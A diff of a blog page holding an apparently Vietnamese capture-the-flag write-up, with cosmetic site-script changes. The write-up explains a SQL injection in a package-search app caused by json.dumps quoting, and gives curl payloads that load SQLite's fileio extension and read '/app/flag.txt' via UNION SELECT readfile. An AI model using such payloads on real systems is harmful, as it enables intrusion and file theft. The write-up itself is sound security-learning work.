@@ -13,26 +13,6 @@ https://packages.challs.pwnoh.io/
 Phân tích source
 
 main.py
-
-
- 1
- 2
- 3
- 4
- 5
- 6
- 7
- 8
- 9
-10
-11
-12
-13
-14
-15
-16
-
-
 distro  = request.args.get(&#34;distro&#34;, &#34;&#34;).strip().lower()
 package = request.args.get(&#34;package&#34;, &#34;&#34;).strip().lower()
 
@@ -49,8 +29,6 @@ sql &#43;= &#34; ORDER BY distro, distro_version, package&#34;
 
 print(sql)
 results = db.execute(sql).fetchall()
-
-
 
 author dùng json.dump để quote tham số người dùng khi ghép chuỗi SQL
 
@@ -132,27 +110,7 @@ module: cần import json để sử dụng">
 <h3 id="phân-tích-source">Phân tích source<a hidden class="anchor" aria-hidden="true" href="#phân-tích-source">#</a></h3>
 <p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SyyEhilxZx.png"></p>
 <p><code>main.py</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">distro</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">args</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;distro&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">).</span><span class="na">strip</span><span class="p">().</span><span class="na">lower</span><span class="p">()</span><span class="w">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">distro</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">args</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;distro&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">).</span><span class="na">strip</span><span class="p">().</span><span class="na">lower</span><span class="p">()</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">package</span><span class="w"> </span><span class="err">= </span><span class="nn">request.args.get</span><span class="p">(</span><span class="s">&#34;package&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">).</span><span class="na">strip</span><span class="p">().</span><span class="na">lower</span><span class="p">()</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;SELECT distro, distro_version, package, package_version FROM packages&#34;</span><span class="w">
@@ -168,31 +126,14 @@ module: cần import json để sử dụng">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">print</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">db</span><span class="p">.</span><span class="na">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">).</span><span class="na">fetchall</span><span class="p">()</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
+</span></span></span></code></pre></div><ul>
 <li>author dùng <code>json.dump</code> để quote tham số người dùng khi ghép chuỗi SQL</li>
 </ul>
 <p><strong>Giải thích về <code>json.dump</code> trong python</strong>
 <code>json.dump</code> được sử dụng để serialize một object python (vd: dictionary, list, tuple, string, int, float, bool, , None) thành định dạng JSON và viết trực tiếp vào một file hoặc file-like object.
 module: cần <code>import json</code> để sử dụng</p>
 <p>ví dụ để serialize một dictionary và ghi vào file <code>ex.json</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;tam&#39;</span><span class="p">,</span>
@@ -203,23 +144,8 @@ module: cần <code>import json</code> để sử dụng</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;ex.json&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">json</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> 
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>ex.json</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span></code></pre></div><p>ex.json</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;tam&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&#34;age&#34;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&#34;city&#34;</span><span class="p">:</span> <span class="s2">&#34;Hai Phong&#34;</span><span class="p">,</span>
@@ -228,9 +154,7 @@ module: cần <code>import json</code> để sử dụng</p>
 </span></span><span class="line"><span class="cl">        <span class="s2">&#34;ngu&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>(indent: số khoảng trắng để thụt lề, mặc định là None)</p>
+</span></span></code></pre></div><p>(indent: số khoảng trắng để thụt lề, mặc định là None)</p>
 <ul>
 <li><code>json.dumps()</code> tạo JSON string (dùng dấu double-quote <code>&quot;</code> và escape bằng backslash <code>\</code> cho các <code>&quot;</code> bên trong để đảm bảo JSON valid</li>
 <li>Đây là cơ chế quoting khác với quoting SQL -&gt; mismatch escaping mechanism
@@ -266,15 +190,8 @@ Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đún
 <p>Có thể request bằng curl:</p>
 </li>
 </ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">curl</span> <span class="s2">&#34;http://localhost:8000/?distro=</span><span class="se">\&#34;</span><span class="s2">%20OR%20(load_extension(&#39;/sqlite/ext/misc/fileio.so&#39;)=0)--&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>-&gt; Trả về tất cả packages (extension được load globally)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">curl</span> <span class="s2">&#34;http://localhost:8000/?distro=</span><span class="se">\&#34;</span><span class="s2">%20OR%20(load_extension(&#39;/sqlite/ext/misc/fileio.so&#39;)=0)--&#34;</span>
+</span></span></code></pre></div><p>-&gt; Trả về tất cả packages (extension được load globally)</p>
 <h4 id="đọc-flag-qua-readfile-với-union">Đọc flag qua <code>readfile</code> với UNION<a hidden class="anchor" aria-hidden="true" href="#đọc-flag-qua-readfile-với-union">#</a></h4>
 <ul>
 <li>Payload cho <code>distro: &quot; OR 0=1 UNION SELECT readfile('/app/flag.txt'), NULL, NULL, NULL--</code></li>
@@ -282,15 +199,8 @@ Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đún
 <li>Parse: Breakout tương tự, WHERE false (0=1, no rows từ packages), rồi UNION thêm row với flag ở cột đầu (readfile trả BLOB, nhưng render thành text).</li>
 <li>Request bằng curl:</li>
 </ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl &#34;http://localhost:8000/?distro=\&#34;%20OR%200=1%20UNION%20SELECT%20readfile(&#39;/app/flag.txt&#39;),%20NULL,%20NULL,%20NULL--&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJ1NP2egbe.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl &#34;http://localhost:8000/?distro=\&#34;%20OR%200=1%20UNION%20SELECT%20readfile(&#39;/app/flag.txt&#39;),%20NULL,%20NULL,%20NULL--&#34;
+</span></span></code></pre></div><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJ1NP2egbe.png"></p>
 <p><strong>Flag: bctf{y0uv3_g0t_4n_apt17ud3_f0r_7h15}</strong></p>
 
 
@@ -319,6 +229,7 @@ Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đún
 </a><div id="three-container" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -9999; background: #000;"></div>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
+    
     let scene, camera, renderer, networkGroup;
     let mouseX = 0, mouseY = 0;
     const container = document.getElementById('three-container');
@@ -394,7 +305,7 @@ Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đún
 
 
 <div id="cyber-back-btn" style="display: none;" onclick="goBack()">
-    <span class="cmd">&lt;</span> <span class="text">RETURN</span>
+    <span class="cmd">&lt; cd ..</span> <span class="text">/ RETURN</span>
 </div>
 
 <div id="hackmd-toc-wrapper" style="display: none;">
@@ -403,34 +314,26 @@ Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đún
 </div>
 
 <script>
-    
     function goBack() {
-        
         if (window.history.length > 1 && document.referrer.indexOf(window.location.host) !== -1) {
             window.history.back();
-        } else {
-            window.location.href = '/'; 
-        }
+        } else { window.location.href = '/'; }
     }
 
-    
     function generateHackMDTOC() {
         const tocWrapper = document.getElementById('hackmd-toc-wrapper');
         const tocContent = document.getElementById('hackmd-toc-content');
         const backBtn = document.getElementById('cyber-back-btn');
         const postContent = document.querySelector('.post-content');
 
-        
         if(tocContent) tocContent.innerHTML = '';
         if(tocWrapper) tocWrapper.style.display = 'none';
         if(backBtn) backBtn.style.display = 'none';
 
-        
         if (postContent && tocContent) {
             
-            if(backBtn) backBtn.style.display = 'block';
+            backBtn.style.display = 'block';
 
-            
             const headings = postContent.querySelectorAll('h1, h2, h3, h4');
             if (headings.length > 0) {
                 tocWrapper.style.display = 'block';
@@ -489,79 +392,151 @@ Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đún
 
 <style>
      
-    #cyber-back-btn {
-        position: fixed;
-        left: 20px;
-        top: 130px;  
-        width: 260px;  
-        padding: 10px 15px;
-        box-sizing: border-box;
-        
-        background: rgba(0, 0, 0, 0.8);
-        border: 1px solid #00ff41;
-        border-left: 5px solid #00ff41;  
-        color: #00ff41;
-        
-        font-family: 'Courier New', monospace;
-        font-weight: bold;
-        font-size: 14px;
-        cursor: pointer;
-        z-index: 95;
-        transition: all 0.3s ease;
-        backdrop-filter: blur(5px);
-        
-        text-transform: uppercase;
-        letter-spacing: 1px;
-    }
-
-    #cyber-back-btn:hover {
-        background: rgba(0, 255, 65, 0.2);
-        box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
-        padding-left: 25px;  
-    }
-    
-    #cyber-back-btn .cmd { opacity: 0.7; margin-right: 5px; }
-
-     
-    #hackmd-toc-wrapper {
-        position: fixed;
-        left: 20px;
-        top: 180px;  
-        width: 260px;
-        max-height: calc(100vh - 200px);
-        overflow-y: auto;
-        z-index: 90;
-        background: transparent;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-        padding-right: 10px;
-    }
-
-    .toc-header {
-        font-family: 'Courier New', monospace;
-        font-size: 11px; font-weight: bold; color: #00ff41;
-        margin-bottom: 15px; border-bottom: 1px solid rgba(0, 255, 65, 0.3);
-        padding-bottom: 5px; opacity: 0.8;
-    }
+    #cyber-back-btn { position: fixed; left: 20px; top: 130px; width: 260px; padding: 10px 15px; box-sizing: border-box; background: rgba(0, 0, 0, 0.8); border: 1px solid #00ff41; border-left: 5px solid #00ff41; color: #00ff41; font-family: 'Courier New', monospace; font-weight: bold; font-size: 14px; cursor: pointer; z-index: 95; transition: all 0.3s ease; backdrop-filter: blur(5px); text-transform: uppercase; letter-spacing: 1px; }
+    #cyber-back-btn:hover { background: rgba(0, 255, 65, 0.2); box-shadow: 0 0 15px rgba(0, 255, 65, 0.4); padding-left: 25px; }
+    #hackmd-toc-wrapper { position: fixed; left: 20px; top: 180px; width: 260px; max-height: calc(100vh - 200px); overflow-y: auto; z-index: 90; background: transparent; padding-right: 10px; }
+    .toc-header { font-family: 'Courier New', monospace; font-size: 11px; font-weight: bold; color: #00ff41; margin-bottom: 15px; border-bottom: 1px solid rgba(0, 255, 65, 0.3); padding-bottom: 5px; opacity: 0.8; }
     #hackmd-toc-content ul { list-style: none; padding: 0; margin: 0; border-left: 2px solid rgba(255, 255, 255, 0.1); }
     #hackmd-toc-content li { margin: 0; position: relative; }
     .toc-link { display: block; text-decoration: none; color: #888; font-size: 13px; padding: 5px 0 5px 15px; line-height: 1.5; transition: all 0.2s ease; border-left: 2px solid transparent; margin-left: -2px; }
     .toc-link:hover { color: #fff; }
     .toc-link.active { color: #00ff41 !important; font-weight: 500; border-left: 2px solid #00ff41; background: linear-gradient(90deg, rgba(0, 255, 65, 0.05), transparent); }
     .toc-item.h1 { padding-left: 0; } .toc-item.h1 .toc-link { font-weight: bold; font-size: 14px; color: #ccc; }
-    .toc-item.h2 { padding-left: 0; }
-    .toc-item.h3 .toc-link { padding-left: 30px; font-size: 12px; }
-    .toc-item.h4 .toc-link { padding-left: 45px; font-size: 11px; opacity: 0.8; }
-    #hackmd-toc-wrapper::-webkit-scrollbar { width: 3px; }
-    #hackmd-toc-wrapper::-webkit-scrollbar-thumb { background: #333; }
+    .toc-item.h2 { padding-left: 0; } .toc-item.h3 .toc-link { padding-left: 30px; font-size: 12px; } .toc-item.h4 .toc-link { padding-left: 45px; font-size: 11px; opacity: 0.8; }
+    #hackmd-toc-wrapper::-webkit-scrollbar { width: 3px; } #hackmd-toc-wrapper::-webkit-scrollbar-thumb { background: #333; }
+    @media screen and (max-width: 1450px) { #hackmd-toc-wrapper, #cyber-back-btn { display: none !important; } }
+</style>
+
+
+<script>
+    
+    function initCodeCopy() {
+        
+        const codeBlocks = document.querySelectorAll('.highlight');
+
+        codeBlocks.forEach(block => {
+            
+            if (block.querySelector('.cyber-copy-btn')) return;
+
+            
+            if (getComputedStyle(block).position === 'static') {
+                block.style.position = 'relative';
+            }
+
+            
+            const btn = document.createElement('button');
+            btn.className = 'cyber-copy-btn';
+            btn.innerHTML = '<span>COPY</span>'; 
+            
+            
+            btn.addEventListener('click', () => {
+                
+                const clone = block.cloneNode(true);
+                
+                
+                const lineNums = clone.querySelectorAll('.ln, .lnt, .lntd:first-child');
+                lineNums.forEach(el => el.remove());
+                
+                
+                const codeText = clone.innerText.trim();
+
+                navigator.clipboard.writeText(codeText).then(() => {
+                    btn.innerHTML = '<span style="color:#fff">COPIED!</span>';
+                    btn.classList.add('copied');
+                    setTimeout(() => {
+                        btn.innerHTML = '<span>COPY</span>';
+                        btn.classList.remove('copied');
+                    }, 2000);
+                });
+            });
+
+            block.appendChild(btn);
+        });
+    }
+</script>
+
+<style>
+     
+     
+    .ln, .lnt, .lntd:first-child { 
+        display: none !important; 
+        width: 0 !important;
+        padding: 0 !important;
+        user-select: none;
+    }
+    
+     
+    .lntd:last-child { 
+        width: 100% !important; 
+        padding-left: 0 !important;
+    }
+    
+     
+    .lntable { 
+        width: 100% !important; 
+        display: block !important; 
+    }
+    .lntable tbody, .lntable tr, .lntable td { 
+        display: block !important; 
+        width: 100% !important; 
+    }
 
      
-    @media screen and (max-width: 1450px) {
-        #hackmd-toc-wrapper, #cyber-back-btn { display: none !important; }
+    .cyber-copy-btn {
+        position: absolute;
+        top: 0;
+        right: 0;
+        z-index: 10;
+        background: rgba(0, 255, 65, 0.1);
+        border: none;
+        border-bottom-left-radius: 5px;
+        border-left: 1px solid #00ff41;
+        border-bottom: 1px solid #00ff41;
+        color: #00ff41;
+        font-family: 'Courier New', monospace;
+        font-size: 11px;
+        font-weight: bold;
+        padding: 5px 10px;
+        cursor: pointer;
+        opacity: 0;  
+        transition: all 0.3s ease;
     }
+
+     
+    .highlight:hover .cyber-copy-btn {
+        opacity: 1;
+    }
+
+    .cyber-copy-btn:hover {
+        background: #00ff41;
+        color: #000;
+    }
+
+     
+    .post-content .highlight {
+        background: #0d1117 !important;  
+        border: 1px solid rgba(0, 255, 65, 0.3);
+        border-radius: 6px;
+        margin-bottom: 20px;
+        overflow: hidden;  
+    }
+    
+    .post-content pre {
+        padding: 15px !important;
+        margin: 0 !important;
+        background: transparent !important;
+        overflow-x: auto;  
+    }
+
+     
+    .post-content pre::-webkit-scrollbar { height: 6px; }
+    .post-content pre::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 3px; }
+    .post-content pre::-webkit-scrollbar-track { background: #1a1a1a; }
 </style>
 
 
 <style>
+     
     .post-single {
         background-color: rgba(0, 0, 0, 0.85) !important;
         backdrop-filter: blur(10px);
@@ -574,17 +549,14 @@ Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đún
         z-index: 1;
     }
     @media screen and (min-width: 1451px) {
-        .post-single {
-            margin-left: 300px !important;
-            width: calc(100% - 300px) !important;
-            max-width: 1000px;
-        }
+        .post-single { margin-left: 300px !important; width: calc(100% - 300px) !important; max-width: 1000px; }
         .main { max-width: 1600px !important; margin: auto; }
     }
-    .post-content { color: #e0e0e0; }
-    .post-content pre { border: 1px solid rgba(0, 255, 65, 0.4); background: #0d1117 !important; }
+    .post-content { color: #e0e0e0; font-family: 'Segoe UI', sans-serif; }
+    .profile img { border-radius: 50% !important; border: 3px solid #00ff41 !important; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4) !important; background: #000; transition: transform 0.3s ease; }
+    .profile img:hover { transform: scale(1.05) rotate(5deg); box-shadow: 0 0 50px rgba(0, 255, 65, 0.9) !important; }
+    .art-widget, .cyber-panel, .avatar-wrapper-hud { display: none !important; }
 </style>
-
 
 <script>
     function initStatusBar() {
@@ -593,12 +565,7 @@ Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đún
         if (header) {
             const statusBar = document.createElement('div');
             statusBar.id = 'system-status-bar';
-            statusBar.innerHTML = `
-                <div class="status-content">
-                    <div class="status-item"><span class="label">SYSTEM:</span> <span class="value">ONLINE</span></div>
-                    <div class="status-clock"><span id="sb-hour">00</span><span class="blink">:</span><span id="sb-min">00</span><span class="blink">:</span><span id="sb-sec">00</span></div>
-                    <div class="status-item"><span class="label">DATE:</span> <span class="value" id="sb-date">LOADING...</span></div>
-                </div>`;
+            statusBar.innerHTML = `<div class="status-content"><div class="status-item"><span class="label">SYSTEM:</span> <span class="value">ONLINE</span></div><div class="status-clock"><span id="sb-hour">00</span><span class="blink">:</span><span id="sb-min">00</span><span class="blink">:</span><span id="sb-sec">00</span></div><div class="status-item"><span class="label">DATE:</span> <span class="value" id="sb-date">LOADING...</span></div></div>`;
             header.parentNode.insertBefore(statusBar, header.nextSibling);
             function updateTime() {
                 const now = new Date();
@@ -620,21 +587,17 @@ Lỗ hổng chính là SQL Injection trong WHERE clause do escaping không đún
 </style>
 
 
-<style>
-    .profile img { border-radius: 50% !important; border: 3px solid #00ff41 !important; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4) !important; background: #000; transition: transform 0.3s ease; }
-    .profile img:hover { transform: scale(1.05) rotate(5deg); box-shadow: 0 0 50px rgba(0, 255, 65, 0.9) !important; }
-    .art-widget, .cyber-panel, .avatar-wrapper-hud { display: none !important; }
-</style>
-
 <script src="https://cdn.jsdelivr.net/npm/pjax/pjax.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
 <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
 <div id="aplayer-fixed"></div>
 
 <script>
+    
     function initAllWidgets() {
         initStatusBar();
         generateHackMDTOC();
+        initCodeCopy(); 
     }
 
     document.addEventListener('DOMContentLoaded', () => {
